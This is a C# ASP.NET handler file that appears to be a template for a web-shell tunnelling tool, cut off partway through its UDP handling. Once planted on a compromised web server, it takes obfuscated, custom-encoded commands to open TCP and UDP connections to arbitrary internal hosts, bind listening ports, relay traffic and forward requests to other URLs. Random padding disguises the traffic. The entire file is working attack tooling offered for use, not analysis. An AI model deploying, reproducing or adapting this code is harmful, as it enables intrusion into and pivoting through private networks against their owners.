<%@ WebHandler Language="C#" Class="GenericHandler1" %>

using System;
using System.Web;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using System.Collections.Generic;

public class GenericHandler1 : IHttpAsyncHandler {
    public class RogerAsyncResult : IAsyncResult {
        private readonly ManualResetEvent waitHandle = new ManualResetEvent(false);
        private readonly AsyncCallback callback;
        private readonly Object state;
        private volatile bool completed;
        private Exception error;

        public RogerAsyncResult(AsyncCallback callback, Object state) {
            this.callback = callback;
            this.state = state;
        }

        public Object AsyncState {
            get { return state; }
        }

        public WaitHandle AsyncWaitHandle {
            get { return waitHandle; }
        }

        public bool CompletedSynchronously {
            get { return false; }
        }

        public bool IsCompleted {
            get { return completed; }
        }

        public Exception Error {
            get { return error; }
        }

        public void Complete(Exception ex) {
            error = ex;
            completed = true;
            waitHandle.Set();
            if (callback != null) callback(this);
        }
    }

    public class UdpReassembly {
        public int Count;
        public int Total;
        public DateTime UpdatedAt = DateTime.UtcNow;
        public Dictionary<int, byte[]> Chunks = new Dictionary<int, byte[]>();
        public UdpReassembly(int count, int total) { Count = count; Total = total; }
    }

    public class TunnelState {
        public readonly Object Sync = new Object();
        public readonly Object ReadSync = new Object();
        public readonly Object WriteSync = new Object();
        public Socket Socket;
        public Socket Listener;
        public bool LocalWriteClosed;
        public bool RemoteWriteClosed;
        public bool Closed;
        public int ReadBuf;
        public int MaxReadSize;
        public int UdpFragSize;
        public bool HalfCloseMode;
        public String ServerCompression;
        public int ServerOptimalLimit;
        public int UdpIdleTimeout;
        public DateTime LastUdpActivity = DateTime.UtcNow;
        public byte[] TcpReadBuffer;
        public byte[] TcpAccumBuffer;
        public readonly Dictionary<int, UdpReassembly> UdpIn = new Dictionary<int, UdpReassembly>();
        public readonly Queue<Object[]> UdpOut = new Queue<Object[]>();

        public void Close() {
            Socket listener = null;
            Socket socket = null;
            lock (Sync) {
                if (Closed) return;
                Closed = true;
                listener = Listener;
                socket = Socket;
                Listener = null;
                Socket = null;
                UdpIn.Clear();
                UdpOut.Clear();
            }
            try { if (listener != null) listener.Close(); } catch (Exception) {}
            try { if (socket != null) socket.Close(); } catch (Exception) {}
        }
    }

    public static readonly Object SharedRandomSync = new Object();
    public static readonly Random SharedRandom = new Random();
    public static readonly String Base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    public static readonly String MappedBase64Chars = "BASE64 CHARSLIST";
    public static readonly char[] Base64ToMapped = BuildCharMap(Base64Chars, MappedBase64Chars);
    public static readonly char[] MappedToBase64 = BuildCharMap(MappedBase64Chars, Base64Chars);

    public static byte[] ReadRequestBody(Stream input, int length) {
        if (length <= 0) return new byte[0];
        byte[] data = new byte[length];
        int offset = 0;
        while (offset < length) {
            int read = input.Read(data, offset, length - offset);
            if (read == 0) throw new EndOfStreamException("Unexpected EOF in HTTP request body");
            offset += read;
        }
        return data;
    }

    public static bool IsWouldBlock(SocketException ex) {
        return ex.SocketErrorCode == SocketError.WouldBlock ||
               ex.SocketErrorCode == SocketError.IOPending ||
               ex.SocketErrorCode == SocketError.NoBufferSpaceAvailable;
    }

    public static byte[] SessionBuffer(ref byte[] buffer, int size) {
        if (buffer == null || buffer.Length < size) buffer = new byte[size];
        return buffer;
    }

    public static TunnelState GetState(HttpApplicationState application, String mark) {
        return application[mark] as TunnelState;
    }

    public static void SetState(HttpApplicationState application, String mark, TunnelState state) {
        TunnelState previous = null;
        application.Lock();
        try {
            previous = application[mark] as TunnelState;
            application[mark] = state;
        } finally {
            application.UnLock();
        }
        if (previous != null) previous.Close();
    }

    public static void RemoveState(HttpApplicationState application, String mark) {
        TunnelState state = null;
        application.Lock();
        try {
            state = application[mark] as TunnelState;
            application.Remove(mark);
        } finally {
            application.UnLock();
        }
        if (state != null) state.Close();
    }

    public static int IntSetting(Object[] info, int key, int fallback) {
        try {
            if (info[key] == null) return fallback;
            int value = int.Parse((String)info[key]);
            return value > 0 ? value : fallback;
        } catch (Exception) { return fallback; }
    }

    public static bool BoolSetting(Object[] info, int key, bool fallback) {
        try {
            if (info[key] == null) return fallback;
            String value = ((String)info[key]).ToLower();
            return value == "1" || value == "true";
        } catch (Exception) { return fallback; }
    }

    public static void ConfigureState(TunnelState state, Object[] info, int readBufOpt, int maxReadOpt, int udpFragOpt, int halfCloseOpt, int serverCompOpt, int serverLimitOpt, int udpTimeoutOpt, int defaultReadBuf, int defaultMaxReadSize, int defaultUdpFragSize, int defaultUdpIdleTimeout, bool defaultHalfCloseMode) {
        state.ReadBuf = IntSetting(info, readBufOpt, defaultReadBuf);
        state.MaxReadSize = IntSetting(info, maxReadOpt, defaultMaxReadSize);
        state.UdpFragSize = IntSetting(info, udpFragOpt, defaultUdpFragSize);
        state.UdpIdleTimeout = IntSetting(info, udpTimeoutOpt, defaultUdpIdleTimeout);
        state.HalfCloseMode = BoolSetting(info, halfCloseOpt, defaultHalfCloseMode);
        state.ServerCompression = CompressionSetting(info, serverCompOpt, "optimal");
        state.ServerOptimalLimit = IntSetting(info, serverLimitOpt, 1024);
    }

    public static void UpdateState(TunnelState state, Object[] info, int readBufOpt, int maxReadOpt, int udpFragOpt, int halfCloseOpt, int serverCompOpt, int serverLimitOpt, int udpTimeoutOpt) {
        lock (state.Sync) {
            if (info[readBufOpt] != null) state.ReadBuf = IntSetting(info, readBufOpt, state.ReadBuf);
            if (info[maxReadOpt] != null) state.MaxReadSize = IntSetting(info, maxReadOpt, state.MaxReadSize);
            if (info[udpFragOpt] != null) state.UdpFragSize = IntSetting(info, udpFragOpt, state.UdpFragSize);
            if (info[udpTimeoutOpt] != null) state.UdpIdleTimeout = IntSetting(info, udpTimeoutOpt, state.UdpIdleTimeout);
            if (info[halfCloseOpt] != null) state.HalfCloseMode = BoolSetting(info, halfCloseOpt, state.HalfCloseMode);
            if (info[serverCompOpt] != null) state.ServerCompression = CompressionSetting(info, serverCompOpt, state.ServerCompression);
            if (info[serverLimitOpt] != null) state.ServerOptimalLimit = IntSetting(info, serverLimitOpt, state.ServerOptimalLimit);
        }
    }

    public static String CompressionSetting(Object[] info, int key, String fallback) {
        try {
            if (info[key] == null) return fallback;
            String value = ((String)info[key]).ToLower();
            return value == "dynamic" || value == "optimal" || value == "smart" ? value : fallback;
        } catch (Exception) { return fallback; }
    }

    public static String ModeSetting(Object[] info, int key, String fallback)
    {
        try
        {
            if (info[key] == null) return fallback;
            String value = ((String)info[key]).ToLower();
            return value == "classic" || value == "half" || value == "full" ? value : fallback;
        }
        catch (Exception)
        {
            return fallback;
        }
    }
    public static List<Object[]> UdpFragmentPayload(byte[] data, int udpFragSize) {
        List<Object[]> fragments = new List<Object[]>();
        if (udpFragSize <= 0) return fragments;
        if (data.Length <= udpFragSize) {
            fragments.Add(new Object[]{null, data});
            return fragments;
        }
        int count = Math.Max(1, (data.Length + udpFragSize - 1) / udpFragSize);
        byte[] idBytes = BitConverter.GetBytes(NextRandomInt());
        if (BitConverter.IsLittleEndian) Array.Reverse(idBytes);
        for (int i = 0; i < count; i++) {
            int start = i * udpFragSize;
            int len = Math.Min(udpFragSize, data.Length - start);
            byte[] meta = new byte[12];
            byte[] chunk = new byte[len];
            idBytes.CopyTo(meta, 0);
            byte[] indexBytes = BitConverter.GetBytes((ushort)i);
            byte[] countBytes = BitConverter.GetBytes((ushort)count);
            byte[] totalBytes = BitConverter.GetBytes(data.Length);
            if (BitConverter.IsLittleEndian) { Array.Reverse(indexBytes); Array.Reverse(countBytes); Array.Reverse(totalBytes); }
            indexBytes.CopyTo(meta, 4);
            countBytes.CopyTo(meta, 6);
            totalBytes.CopyTo(meta, 8);
            System.Buffer.BlockCopy(data, start, chunk, 0, len);
            fragments.Add(new Object[]{meta, chunk});
        }
        return fragments;
    }

    public static byte[] UdpReassembleFragment(Dictionary<int, UdpReassembly> buffers, byte[] data, byte[] meta) {
        if (meta == null || meta.Length == 0) return data;
        if (meta.Length != 12) return null;
        byte[] idBytes = new byte[4], indexBytes = new byte[2], countBytes = new byte[2], totalBytes = new byte[4];
        System.Buffer.BlockCopy(meta, 0, idBytes, 0, 4);
        System.Buffer.BlockCopy(meta, 4, indexBytes, 0, 2);
        System.Buffer.BlockCopy(meta, 6, countBytes, 0, 2);
        System.Buffer.BlockCopy(meta, 8, totalBytes, 0, 4);
        if (BitConverter.IsLittleEndian) { Array.Reverse(idBytes); Array.Reverse(indexBytes); Array.Reverse(countBytes); Array.Reverse(totalBytes); }
        int id = BitConverter.ToInt32(idBytes, 0);
        int index = BitConverter.ToUInt16(indexBytes, 0);
        int count = BitConverter.ToUInt16(countBytes, 0);
        int total = BitConverter.ToInt32(totalBytes, 0);
        if (count < 1 || index >= count || total > UDPMAXSIZE) return null;
        List<int> expired = new List<int>();
        foreach (KeyValuePair<int, UdpReassembly> item in buffers) {
            if ((DateTime.UtcNow - item.Value.UpdatedAt).TotalSeconds > 30) expired.Add(item.Key);
        }
        foreach (int expiredId in expired) buffers.Remove(expiredId);
        if (!buffers.ContainsKey(id)) buffers[id] = new UdpReassembly(count, total);
        if (buffers[id].Count != count || buffers[id].Total != total) { buffers.Remove(id); return null; }
        buffers[id].UpdatedAt = DateTime.UtcNow;
        buffers[id].Chunks[index] = data;
        if (buffers[id].Chunks.Count != count) return null;
        MemoryStream assembled = new MemoryStream();
        for (int i = 0; i < count; i++) {
            if (!buffers[id].Chunks.ContainsKey(i)) return null;
            byte[] part = buffers[id].Chunks[i];
            assembled.Write(part, 0, part.Length);
        }
        buffers.Remove(id);
        byte[] packet = assembled.ToArray();
        if (packet.Length != total) return null;
        return packet;
    }

    public static int FillDownlinkFrame(Object[] rinfo, TunnelState state, int DATA, int CMD, int STATUS, int ERROR, int IP, int PORT, int UDPFRAG)
    {
        if (state == null)
        {
            rinfo[STATUS] = "FAIL";
            rinfo[ERROR] = "Session is closed";
            return 1;
        }
        Socket s;
        lock (state.Sync)
        {
            if (state.Closed)
            {
                rinfo[STATUS] = "FAIL";
                rinfo[ERROR] = "Session is closed";
                return 1;
            }
            if (state.Socket == null)
            {
                rinfo[STATUS] = "OK";
                rinfo[CMD] = "HEARTBEAT";
                return 0;
            }
            s = state.Socket;
        }
        if (s.ProtocolType == ProtocolType.Tcp)
        {
            lock (state.ReadSync)
            {
                try
                {
                    int maxRead = state.MaxReadSize;
                    int readbuflen = Math.Min(state.ReadBuf, maxRead);
                    byte[] readBuff = SessionBuffer(ref state.TcpReadBuffer, readbuflen);
                    byte[] readData = SessionBuffer(ref state.TcpAccumBuffer, maxRead);
                    int readLen = 0;
                    bool remoteClosed = false;
                    try
                    {
                        while (readLen < maxRead)
                        {
                            int remaining = maxRead - readLen;
                            int requested = Math.Min(readbuflen, remaining);
                            int c = BeginReceiveReady(s, readBuff, 0, requested);
                            if (c <= 0)
                            {
                                remoteClosed = true;
                                break;
                            }
                            System.Buffer.BlockCopy(readBuff, 0, readData, readLen, c);
                            readLen += c;
                            if (c < requested) break;
                        }
                    }
                    catch (SocketException ex)
                    {
                        if (!IsWouldBlock(ex)) throw;
                    }

                    rinfo[STATUS] = "OK";
                    if (readLen > 0)
                    {
                        if (remoteClosed) state.RemoteWriteClosed = true;
                        byte[] newBuff = new byte[readLen];
                        System.Buffer.BlockCopy(readData, 0, newBuff, 0, readLen);
                        rinfo[CMD] = "DATA";
                        rinfo[DATA] = newBuff;
                        return 0;
                    }
                    if (remoteClosed || state.RemoteWriteClosed)
                    {
                        state.RemoteWriteClosed = true;
                        if (state.HalfCloseMode)
                        {
                            rinfo[CMD] = "SHUT_WR";
                            return 1;
                        }
                        return 2;
                    }
                    rinfo[CMD] = "HEARTBEAT";
                    return 0;
                }
                catch (Exception ex)
                {
                    rinfo[STATUS] = "FAIL";
                    rinfo[ERROR] = ex.Message;
                    return 1;
                }
            }
        }

        if (s.ProtocolType == ProtocolType.Udp)
        {
            lock (state.ReadSync)
            {
                try
                {
                    if ((DateTime.UtcNow - state.LastUdpActivity).TotalSeconds > state.UdpIdleTimeout)
                    {
                        rinfo[STATUS] = "FAIL";
                        rinfo[ERROR] = "Session is closed";
                        return 1;
                    }
                    Queue<Object[]> udpOut = state.UdpOut;
                    byte[] readBuff = new byte[65497];
                    if (udpOut.Count == 0)
                    {
                        EndPoint remoteEP = new IPEndPoint(IPAddress.Any, 0);
                        try
                        {
                            int c = s.ReceiveFrom(readBuff, ref remoteEP);
                            if (c > 0)
                            {
                                state.LastUdpActivity = DateTime.UtcNow;
                                byte[] newBuff = new byte[c];
                                System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
                                foreach (Object[] fragment in UdpFragmentPayload(newBuff, state.UdpFragSize))
                                {
                                    udpOut.Enqueue(new Object[]{fragment, remoteEP});
                                }
                            }
                        }
                        catch (SocketException ex)
                        {
                            if (!IsWouldBlock(ex)) throw;
                        }
                    }
                    if (udpOut.Count > 0)
                    {
                        Object[] packet = udpOut.Dequeue();
                        Object[] fragment = (Object[])packet[0];
                        byte[] newBuff = (byte[])fragment[1];
                        if (fragment[0] != null) rinfo[UDPFRAG] = (byte[])fragment[0];
                        IPEndPoint remoteEP = (IPEndPoint)packet[1];
                        rinfo[STATUS] = "OK";
                        rinfo[CMD] = "DATA";
                        rinfo[IP] = remoteEP.Address.ToString();
                        rinfo[PORT] = remoteEP.Port.ToString();
                        rinfo[DATA] = newBuff;
                        return 0;
                    }
                    rinfo[STATUS] = "OK";
                    rinfo[CMD] = "HEARTBEAT";
                    return 0;
                }
                catch (Exception ex)
                {
                    rinfo[STATUS] = "FAIL";
                    rinfo[ERROR] = ex.Message;
                    return 1;
                }
            }
        }

        rinfo[STATUS] = "FAIL";
        rinfo[ERROR] = "Unsupported socket type";
        return 1;
    }
    public static char[] BuildCharMap(String frm, String to) {
        char[] map = new char[256];
        for (int i = 0; i < map.Length; i++) map[i] = (char)i;
        for (int i = 0; i < frm.Length && i < to.Length; i++) {
            char c = frm[i];
            if (c < map.Length) map[c] = to[i];
        }
        return map;
    }

    public static String TranslateChars(String input, char[] map) {
        char[] chars = input.ToCharArray();
        for (int i = 0; i < chars.Length; i++) {
            char c = chars[i];
            if (c < map.Length) chars[i] = map[c];
        }
        return new String(chars);
    }

    public String StrTr(string input, string frm, string to) {
        if (frm == Base64Chars && to == MappedBase64Chars) return TranslateChars(input, Base64ToMapped);
        if (frm == MappedBase64Chars && to == Base64Chars) return TranslateChars(input, MappedToBase64);
        return TranslateChars(input, BuildCharMap(frm, to));
    }

    public String Base64EncodeMapped(byte[] data) {
        return TranslateChars(Convert.ToBase64String(data), Base64ToMapped);
    }

    public byte[] Base64DecodeMapped(String data) {
        return Convert.FromBase64String(TranslateChars(data, MappedToBase64));
    }

    public static Object[] blv_decode(byte[] data) {
        Object[] info = new Object[40];

        int i = 0;
        int data_len = data.Length;
        int b;
        byte[] length = new byte[4];

        MemoryStream dataInput = new MemoryStream(data);

        while ( i < data_len ) {
            b = dataInput.ReadByte();
            if (b < 0 || b >= info.Length || dataInput.Read(length, 0, length.Length) != length.Length)
                throw new InvalidDataException("Invalid BLV header");
            int l = bytesToInt(length) - BLV_L_OFFSET;
            if (l < 0 || l > data_len - i - 5)
                throw new InvalidDataException("Invalid BLV field length");
            byte[] v = new byte[l];
            if (dataInput.Read(v, 0, v.Length) != v.Length)
                throw new EndOfStreamException("Unexpected EOF in BLV field");
            i += ( 5 + l );
            if ( b > 1 && b <= BLVHEAD_LEN && b != 10 ) {
                info[b] = Encoding.Default.GetString(v);
            } else {
                info[b] = v;
            }
        }
        if (info[1] != null && info[11] != null) {
            info[1] = ZlibDecompress((byte[]) info[1]);
        }

        return info;
    }

    public static byte[] blv_encode(Object[] info) {
        return blv_encode(info, "optimal", 1024);
    }

    public static byte[] blv_encode(Object[] info, String compressionMode, int optimalLimit) {
        info[0]  = randBytes(5, 20);
        info[39] = randBytes(5, 20);
        MemoryStream buf = new MemoryStream();
        bool dataCompressed = false;
        for (int b = 0; b < info.Length; b++) {
            if ( info[b] != null ) {
                if (b == 11) continue;
                Object o = info[b];
                byte[] v;
                if ( o is String ){
                    v = Encoding.Default.GetBytes( (String) o );
                } else {
                    v = (byte[]) o;
                }
                if (b == 1 && v.Length == 0) continue;
                if (b == 1 && ShouldCompressData(compressionMode, v, optimalLimit)) {
                    v = ZlibCompress(v, CompressionLevelFor(compressionMode, v.Length));
                    dataCompressed = true;
                }
                buf.WriteByte((byte) b);
                byte[] l = intToBytes(v.Length + BLV_L_OFFSET);
                buf.Write(l, 0, l.Length);
                buf.Write(v, 0, v.Length);
            }
        }
        if (dataCompressed) {
            byte[] v = Encoding.Default.GetBytes("1");
            buf.WriteByte(11);
            byte[] l = intToBytes(v.Length + BLV_L_OFFSET);
            buf.Write(l, 0, l.Length);
            buf.Write(v, 0, v.Length);
        }
        return buf.ToArray();
    }

    public byte[] blv_encode_compact(Object[] info, String compressionMode, int optimalLimit)
    {
        MemoryStream buf = new MemoryStream();
        bool dataCompressed = false;
        for (int b = 0; b < info.Length; b++)
        {
            if (info[b] != null)
            {
                if (b == 11) continue;
                Object o = info[b];
                byte[] v;
                if (o is String) v = Encoding.Default.GetBytes((String)o);
                else v = (byte[])o;
                if (b == 1 && v.Length == 0) continue;
                if (b == 1 && ShouldCompressData(compressionMode, v, optimalLimit))
                {
                    v = ZlibCompress(v, CompressionLevelFor(compressionMode, v.Length));
                    dataCompressed = true;
                }
                buf.WriteByte((byte)b);
                byte[] l = intToBytes(v.Length + BLV_L_OFFSET);
                buf.Write(l, 0, l.Length);
                buf.Write(v, 0, v.Length);
            }
        }
        if (dataCompressed)
        {
            byte[] v = Encoding.Default.GetBytes("1");
            buf.WriteByte(11);
            byte[] l = intToBytes(v.Length + BLV_L_OFFSET);
            buf.Write(l, 0, l.Length);
            buf.Write(v, 0, v.Length);
        }
        return buf.ToArray();
    }

    public String StreamFrame(Object[] info, String compressionMode, int optimalLimit, String en, String de)
    {
        String payload = Base64EncodeMapped(blv_encode_compact(info, compressionMode, optimalLimit)).TrimEnd('=');
        return payload.Length.ToString("x8") + payload;
    }

    public void WriteStreamFrame(HttpResponse response, Object[] info, String compressionMode, int optimalLimit, String en, String de)
    {
        response.Write(StreamFrame(info, compressionMode, optimalLimit, en, de));
        response.Flush();
        try { response.OutputStream.Flush(); } catch (Exception) {}
    }
    public static CompressionLevel CompressionLevelFor(String compressionMode, int dataLength) {
        if (compressionMode == "optimal" || compressionMode == "smart" || dataLength <= 65536) return CompressionLevel.Fastest;
        return CompressionLevel.Optimal;
    }

    public static double ByteEntropy(byte[] data) {
        if (data == null || data.Length == 0) return 0.0;
        int[] counts = new int[256];
        for (int i = 0; i < data.Length; i++) {
            counts[data[i]] += 1;
        }
        double entropy = 0.0;
        for (int i = 0; i < counts.Length; i++) {
            if (counts[i] == 0) continue;
            double probability = (double)counts[i] / (double)data.Length;
            entropy -= probability * (Math.Log(probability) / Math.Log(2.0));
        }
        return entropy;
    }

    public static bool ShouldCompressData(String compressionMode, byte[] data, int optimalLimit) {
        if (data == null) return false;
        if (compressionMode == "smart") return data.Length > 1024 && ByteEntropy(data) < 7.5;
        if (data.Length <= optimalLimit) return false;
        return compressionMode == "optimal" || compressionMode == "dynamic";
    }

    public static byte[] ZlibCompress(byte[] data, CompressionLevel level) {
        MemoryStream output = new MemoryStream();
        output.WriteByte(0x78);
        output.WriteByte(level == CompressionLevel.Fastest ? (byte)0x01 : (byte)0xDA);
        using (DeflateStream deflate = new DeflateStream(output, level, true)) {
            deflate.Write(data, 0, data.Length);
        }
        byte[] sum = intToBytes(Adler32(data));
        output.Write(sum, 0, sum.Length);
        return output.ToArray();
    }

    public static byte[] ZlibDecompress(byte[] data) {
        int offset = data.Length >= 6 && data[0] == 0x78 ? 2 : 0;
        int length = data.Length - offset - (offset == 2 ? 4 : 0);
        MemoryStream input = new MemoryStream(data, offset, length);
        MemoryStream output = new MemoryStream();
        using (DeflateStream deflate = new DeflateStream(input, CompressionMode.Decompress)) {
            byte[] buffer = new byte[4096];
            int read;
            while ((read = deflate.Read(buffer, 0, buffer.Length)) > 0) {
                output.Write(buffer, 0, read);
            }
        }
        return output.ToArray();
    }

    public static int Adler32(byte[] data) {
        uint a = 1;
        uint b = 0;
        foreach (byte value in data) {
            a = (a + value) % 65521;
            b = (b + a) % 65521;
        }
        return (int)((b << 16) | a);
    }

    public static int NextRandomInt() {
        lock (SharedRandomSync) {
            return SharedRandom.Next();
        }
    }

    public static byte[] randBytes(int min, int max) {
        int len;
        byte[] randbytes;
        lock (SharedRandomSync) {
            len = SharedRandom.Next(min, max);
            randbytes = new byte[len];
            SharedRandom.NextBytes(randbytes);
        }
        return randbytes;
    }

    public static byte[] randBytes(Random r, int min, int max) {
        int len = r.Next(min, max);
        byte[] randbytes = new byte[len];
        r.NextBytes(randbytes);
        return randbytes;
    }

    public static int bytesToInt(byte[] bytes) {
        int i;
        i =   (  bytes[3] & 0xff )
            | (( bytes[2] & 0xff ) << 8 )
            | (( bytes[1] & 0xff ) << 16)
            | (( bytes[0] & 0xff ) << 24);
        return i;
    }

    public static byte[] intToBytes(int value) {
        byte[] src = new byte[4];
        src[3] = (byte) (value & 0xFF);
        src[2] = (byte) ((value >> 8) & 0xFF);
        src[1] = (byte) ((value >> 16) & 0xFF);
        src[0] = (byte) ((value >> 24) & 0xFF);
        return src;
    }

    public static void SendAll(Socket socket, byte[] data) {
        int offset = 0;
        while (offset < data.Length) {
            int sent = BeginSendWait(socket, data, offset, data.Length - offset);
            if (sent <= 0) {
                throw new SocketException();
            }
            offset += sent;
        }
    }

    public static void ConnectWait(Socket socket, EndPoint remoteEP, int timeoutMs) {
        IAsyncResult result = socket.BeginConnect(remoteEP, null, null);
        bool completed = result.AsyncWaitHandle.WaitOne(timeoutMs, true);
        try {
            if (!completed || !socket.Connected) throw new SocketException((int)SocketError.TimedOut);
            socket.EndConnect(result);
        } finally {
            result.AsyncWaitHandle.Close();
        }
    }

    public static int BeginReceiveReady(Socket socket, byte[] buffer, int offset, int size) {
        if (!socket.Poll(0, SelectMode.SelectRead)) {
            throw new SocketException((int)SocketError.WouldBlock);
        }
        IAsyncResult result = socket.BeginReceive(buffer, offset, size, SocketFlags.None, null, null);
        try {
            return socket.EndReceive(result);
        } finally {
            result.AsyncWaitHandle.Close();
        }
    }

    public static int BeginSendWait(Socket socket, byte[] buffer, int offset, int size) {
        IAsyncResult result = socket.BeginSend(buffer, offset, size, SocketFlags.None, null, null);
        try {
            if (!result.AsyncWaitHandle.WaitOne(300000, true)) {
                throw new SocketException((int)SocketError.TimedOut);
            }
            return socket.EndSend(result);
        } finally {
            result.AsyncWaitHandle.Close();
        }
    }

    public static void BeginAcceptPeer(TunnelState state, Socket listener) {
        listener.BeginAccept(delegate(IAsyncResult result) {
            Socket accepted = null;
            bool closeAccepted = false;
            try {
                accepted = listener.EndAccept(result);
                accepted.Blocking = false;
                lock (state.Sync) {
                    if (state.Closed) {
                        closeAccepted = true;
                        return;
                    }
                    state.Socket = accepted;
                    state.Listener = null;
                }
            } catch (ObjectDisposedException) {
            } catch (SocketException) {
            } finally {
                if (closeAccepted) {
                    try { accepted.Close(); } catch (Exception) {}
                }
                try { listener.Close(); } catch (Exception) {}
            }
        }, null);
    }

    public IAsyncResult BeginProcessRequest(HttpContext context, AsyncCallback callback, Object extraData) {
        RogerAsyncResult result = new RogerAsyncResult(callback, extraData);
        ThreadPool.QueueUserWorkItem(delegate(Object state) {
            Exception error = null;
            try {
                ProcessRequest(context);
            } catch (Exception ex) {
                error = ex;
            }
            result.Complete(error);
        });
        return result;
    }

    public void EndProcessRequest(IAsyncResult result) {
        RogerAsyncResult rogerResult = result as RogerAsyncResult;
        if (rogerResult == null) throw new ArgumentException("Invalid async result");
        rogerResult.AsyncWaitHandle.WaitOne();
        if (rogerResult.Error != null) throw rogerResult.Error;
    }

    public void ProcessRequest (HttpContext context) {

        int DATA          = 1;
        int CMD           = 2;
        int MARK          = 3;
        int STATUS        = 4;
        int ERROR         = 5;
        int IP            = 6;
        int PORT          = 7;
        int REDIRECTURL   = 8;
        int FORCEREDIRECT = 9;
        int UDPFRAG       = 10;
        int DATACOMP      = 11;
        int READBUFOPT    = 12;
        int MAXREADOPT    = 13;
        int UDPFRAGOPT    = 14;
        int HALFCLOSEOPT  = 15;
        int CLIENTCOMPOPT = 16;
        int SERVERCOMPOPT = 17;
        int CLIENTLIMITOPT = 18;
        int SERVERLIMITOPT = 19;
        int UDPTIMEOUTOPT = 20;
        int MODEOPT = 21;
        int MODES = 22;

        String rogerHello = "Roger says, 'All seems fine'";

        Object[] info  = new Object[40];
        Object[] rinfo = new Object[40];

        String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        String de = "BASE64 CHARSLIST";

        String requestDataHead = "";
        String requestDataTail = "";

        if (context.Request.ContentLength > 0) {
            byte[] buff = ReadRequestBody(context.Request.InputStream, context.Request.ContentLength);
            String inputData = Encoding.Default.GetString(buff);
            if (USE_REQUEST_TEMPLATE == 1 && inputData.Length > 0) {
                requestDataHead = inputData.Substring(0, START_INDEX);
                requestDataTail = inputData.Substring(inputData.Length - END_INDEX, END_INDEX);

                inputData = inputData.Substring(START_INDEX);
                inputData = inputData.Substring(0, inputData.Length - END_INDEX);
            }
            byte[] data = Base64DecodeMapped(inputData);
            info = blv_decode(data);
        }

        String rUrl = (String) info[REDIRECTURL];
        if (rUrl != null){
            Uri u = new Uri(rUrl);
            WebRequest request = WebRequest.Create(u);
            request.Method = context.Request.HttpMethod;
            foreach (string key in context.Request.Headers)
            {
                try{
                    request.Headers.Add(key, context.Request.Headers.Get(key));
                } catch (Exception e){}
            }

            try{
                Stream body = request.GetRequestStream();
                info[REDIRECTURL] = null;
                byte[] data = Encoding.Default.GetBytes(String.Concat(requestDataHead, Base64EncodeMapped(blv_encode(info)), requestDataTail));
                body.Write(data, 0, data.Length);
                body.Close();
            } catch (Exception e){}

            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            WebHeaderCollection webHeader = response.Headers;
            for (int i=0;i < webHeader.Count; i++)
            {
                string rkey = webHeader.GetKey(i);
                if (rkey != "Content-Length" && rkey != "Transfer-Encoding")
                    context.Response.AddHeader(rkey, webHeader[i]);
            }

            StreamReader repBody = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding("UTF-8"));
            string rbody = repBody.ReadToEnd();
            context.Response.AddHeader("Content-Length", rbody.Length.ToString());
            context.Response.Write(rbody);
            return;
        }

        context.Response.StatusCode = HTTPCODE;
        String cmd = (String) info[CMD];
        if (cmd != null) {
            String mark = (String) info[MARK];
            if (cmd == "CAPS") {
                rinfo[STATUS] = "OK";
                rinfo[MODES] = "classic,half";
            } else if (cmd == "PROBE") {
                rinfo[STATUS] = "OK";
            } else if (cmd == "SETTINGS") {
                rinfo[STATUS] = "OK";
            } else if (cmd == "UPDATE_SETTINGS") {
                TunnelState state = GetState(context.Application, mark);
                if (state != null) {
                    UpdateState(state, info, READBUFOPT, MAXREADOPT, UDPFRAGOPT, HALFCLOSEOPT, SERVERCOMPOPT, SERVERLIMITOPT, UDPTIMEOUTOPT);
                    rinfo[STATUS] = "OK";
                } else {
                    rinfo[STATUS] = "FAIL";
                    rinfo[ERROR] = "Session is closed";
                }
            } else if (cmd == "CONNECT") {
                Socket sender = null;
                try {
                    String target = (String) info[IP];
                    int port = int.Parse((String) info[PORT]);
                    IPAddress ip;
                    if (!IPAddress.TryParse(target, out ip)) ip = Dns.GetHostEntry(target).AddressList[0];
                    sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    ConnectWait(sender, new IPEndPoint(ip, port), 2000);
                    sender.Blocking = false;
                    TunnelState state = new TunnelState();
                    ConfigureState(state, info, READBUFOPT, MAXREADOPT, UDPFRAGOPT, HALFCLOSEOPT, SERVERCOMPOPT, SERVERLIMITOPT, UDPTIMEOUTOPT, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE);
                    state.Socket = sender;
                    SetState(context.Application, mark, state);
                    sender = null;
                    rinfo[STATUS] = "OK";
                } catch (Exception ex) {
                    if (sender != null) sender.Close();
                    rinfo[STATUS] = "FAIL";
                    rinfo[ERROR] = ex.Message;
                }
            } else if (cmd == "BIND") {
                try {
                    String target = (String) info[IP];
                    int port = int.Parse((String) info[PORT]);
                    IPAddress ip = IPAddress.Parse(target);
                    Socket listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    listener.Bind(new IPEndPoint(ip, port));
                    listener.Listen(1);
                    TunnelState state = new TunnelState();
                    ConfigureState(state, info, READBUFOPT, MAXREADOPT, UDPFRAGOPT, HALFCLOSEOPT, SERVERCOMPOPT, SERVERLIMITOPT, UDPTIMEOUTOPT, READBUF, MAXREADSIZE, UDPFRAGSIZE, UDP_IDLE_TIMEOUT, HALF_CLOSE_MODE);
                    state.Listener = listener;
                    SetState(context.Application, mark, state);
                    BeginAcceptPeer(state, listener);
                    rinfo[STATUS] = "OK";
                    rinfo[IP] = ((IPEndPoint)listener.LocalEndPoint).Address.ToString();
                    rinfo[PORT] = ((IPEndPoint)listener.LocalEndPoint).Port.ToString();
                } catch (Exception ex) {
                    rinfo[STATUS] = "FAIL";
                    rinfo[ERROR] = ex.Message;
                }
            } else if (cmd == "UDP") {
                try {
                    String target = (String) info[IP];
                    int port = int.Parse((String) info[PORT]);
                    IPAddress ip;
                    if (!IPAddress.TryParse(target, out ip)) ip = Dns.GetHostEntry(target).AddressList[0];
                    Socket relay = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
